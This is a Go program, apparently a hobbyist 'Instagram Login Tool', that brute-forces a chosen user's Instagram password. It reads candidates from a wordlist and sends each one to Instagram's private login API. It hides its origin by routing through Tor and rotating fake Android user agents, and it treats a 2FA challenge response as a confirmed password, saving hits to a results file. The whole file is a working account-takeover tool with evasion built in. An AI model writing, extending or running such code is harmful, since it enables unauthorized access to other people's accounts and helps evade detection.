package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"golang.org/x/net/proxy"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_USER = "monsmain"
	RATE_LIMIT   = time.Second // 1 request per second per worker
	WORKER_COUNT = 2           // can be configurable
)

var userAgents = []string{
	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
	"Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
	"Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
	"Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
	"Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
	"Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
	"Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
	"Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
	"Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

type LoginResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Time     string `json:"time"`
	Message  string `json:"message"`
}

func clearTerminal() {
	if strings.Contains(strings.ToLower(runtime.GOOS), "windows") {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func main() {
	clearTerminal()
	setupLogger()
	fmt.Println(" ***Instagram Login Tool*** ")
	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
	fmt.Println("Checking Public IPs...\n")

	ipDirect, errDirect := getPublicIP(&http.Client{Timeout: 10 * time.Second})
	ipTor, torOK := getTorIP()

	if errDirect != nil {
		fmt.Println("Error getting direct IP:", errDirect)
	} else {
		fmt.Println("[Direct] Public IP:", ipDirect)
	}

	if torOK {
		fmt.Println("[TOR]    Public IP:", ipTor)
		if errDirect == nil && ipDirect != ipTor {
			fmt.Println("TOR is working (IP changed)\n")
		} else {
			fmt.Println("TOR is NOT working (IP did not change)\n")
		}
	} else {
		fmt.Println("[TOR]    Unable to connect through TOR. (TOR is NOT working)\n")
	}

	useTor := torOK

	if useTor {
		fmt.Println("tor is active...\n")
	} else {
		fmt.Println("TOR is not active , direct connection is active\n")
	}

	username := getUsername()
	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt or password.json!")
		return
	}
	fmt.Printf("\nLoaded %d passwords\n", len(passwords))

	fmt.Println("\nStarting login attempts...\n")
	found := make(chan LoginResult, 1)
	progress := make(chan int, len(passwords))

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var wg sync.WaitGroup

	jobs := make(chan string, len(passwords))

	// Rate-limited worker pool
	for i := 0; i < WORKER_COUNT; i++ {
		wg.Add(1)
		go func(workerId int) {
			defer wg.Done()
			ticker := time.NewTicker(RATE_LIMIT)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case password, ok := <-jobs:
					if !ok {
						return
					}
					<-ticker.C
					res := tryLogin(ctx, username, password, useTor)
					progress <- 1
					if res.Success {
						select {
						case found <- res:
						default:
						}
						cancel() // cancel context for all workers
						return
					}
				}
			}
		}(i)
	}

	go func() {
		for _, password := range passwords {
			select {
			case <-ctx.Done():
				break
			default:
				jobs <- password
			}
		}
		close(jobs)
	}()

	go showProgressBar(len(passwords), progress)

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case res := <-found:
		fmt.Printf("\n✅ PASSWORD FOUND: %s\n", res.Password)
		fmt.Printf("Username: %s\n", username)
		fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
		saveResultJSON(res)
	case <-done:
		fmt.Println("\n❌ No valid password found in the given list.")
		saveResultJSON(LoginResult{
			Username: username,
			Password: "",
			Success:  false,
			Time:     time.Now().Format("2006-01-02 15:04:05"),
			Message:  "Not found",
		})
	}
}

func getPublicIP(client *http.Client) (string, error) {
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(ip), nil
}

func getTorIP() (string, bool) {
	socksProxy := "127.0.0.1:9050"
	dialer, err := proxy.SOCKS5("tcp", socksProxy, nil, proxy.Direct)
	if err != nil {
		return "", false
	}
	transport := &http.Transport{Dial: dialer.Dial}
	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}
	ip, err := getPublicIP(client)
	if err != nil {
		return "", false
	}
	return ip, true
}

func setupLogger() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
	}
}

func getUsername() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Instagram username: ")
	username, _ := reader.ReadString('\n')
	return trim(username)
}

func showProgressBar(total int, progress <-chan int) {
	completed := 0
	for range progress {
		completed++
		printProgress(completed, total)
	}
}

func tryLogin(ctx context.Context, username, password string, useTor bool) LoginResult {
	loginUrl := API_URL + "accounts/login/"
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	var client *http.Client
	if useTor {
		dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
		if err == nil {
			transport := &http.Transport{Dial: dialer.Dial}
			client = &http.Client{Transport: transport, Timeout: TIMEOUT}
		} else {
			client = &http.Client{Timeout: TIMEOUT}
		}
	} else {
		client = &http.Client{Timeout: TIMEOUT}
	}

	req, err := http.NewRequestWithContext(ctx, "POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "HTTP error"}
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Read error"}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Parse error"}
	}

	success := response.Status == "ok" || strings.Contains(string(body), "logged_in_user")

	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
		return LoginResult{Username: username, Password: password, Success: true, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "challenge or success"}
	}

	msg := response.Message
	if response.ErrorType == "bad_password" {
		msg = "invalid password"
	}
	if response.ErrorType == "invalid_user" {
		msg = "invalid username"
	}
	return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: msg}
}

func loadPasswords() []string {
	var passwords []string

	file, err := os.Open("password.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pass := strings.TrimSpace(scanner.Text())
			if pass != "" {
				passwords = append(passwords, pass)
			}
		}
	} else {
		log.Printf("Error opening password file: %v", err)
	}

	fileJSON, errj := os.Open("password.json")
	if errj == nil {
		defer fileJSON.Close()
		var jsonPasswords []string
		decoder := json.NewDecoder(fileJSON)
		if err := decoder.Decode(&jsonPasswords); err == nil {
			passwords = append(passwords, jsonPasswords...)
		}
	}

	return passwords
}

func saveResultJSON(result LoginResult) {
	file, err := os.OpenFile("results.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	enc := json.NewEncoder(file)
	err = enc.Encode(result)
	if err != nil {
		log.Printf("Error encoding result: %v", err)
	}
}

func trim(s string) string {
	return strings.TrimSpace(s)
}

func printProgress(current, total int) {
	percent := (current * 100) / total
	bar := strings.Repeat("█", percent/2) + strings.Repeat("-", 50-percent/2)
	os.Stdout.WriteString(
		"\r[" + bar + "] " +
			fmt.Sprintf(" %d/%d ", current, total) +
			fmt.Sprintf(" %d%%", percent))
	if current == total {
		os.Stdout.WriteString("\n")
	}
}
